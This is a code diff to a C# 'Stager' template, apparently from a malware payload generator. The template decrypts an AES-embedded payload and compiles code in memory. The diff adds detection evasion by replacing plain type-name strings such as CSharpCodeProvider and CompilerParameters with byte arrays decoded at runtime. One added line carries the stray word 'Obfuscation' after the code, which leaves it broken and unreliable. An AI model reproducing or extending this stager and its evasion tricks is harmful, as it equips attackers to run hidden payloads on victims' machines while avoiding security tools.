@@ -14,7 +14,7 @@ internal static class Stager
                       System.Environment.SetEnvironmentVariable(e2, "0");
 
                       var content = "{{aes.Data}}";
-                      var vector = new byte[] { {{Utils.Hex(aes.Iv)}} };
+                      var vector = new byte[] { {{Utils.Hex(aes.Iv)}} };Obfuscation
                       var seed = new byte[] { {{Utils.Hex(aes.Salt)}} };
                       var token = new byte[] { {{Utils.Hex(aes.Key)}} };
 
@@ -40,11 +40,13 @@ internal static class Stager
                               source = reader.ReadToEnd();
                       }
 
-                      var provType = System.Type.GetType("Microsoft.CSharp.CSharpCodeProvider, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089");
+                      var provTypeName = System.Text.Encoding.UTF8.GetString(new byte[]{{{Utils.Bytes("Microsoft.CSharp.CSharpCodeProvider, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")}}});
+                      var provType = System.Type.GetType(provTypeName);
                       var provider = System.Activator.CreateInstance(provType);
                       try
                       {
-                          var paramType = System.Type.GetType("System.CodeDom.Compiler.CompilerParameters, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089");
+                          var paramTypeName = System.Text.Encoding.UTF8.GetString(new byte[]{{{Utils.Bytes("System.CodeDom.Compiler.CompilerParameters, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")}}});
+                          var paramType = System.Type.GetType(paramTypeName);
                           var parameters = System.Activator.CreateInstance(paramType);
                           paramType.GetProperty("GenerateInMemory").SetValue(parameters, true);
                           var refs = paramType.GetProperty("ReferencedAssemblies").GetValue(parameters);
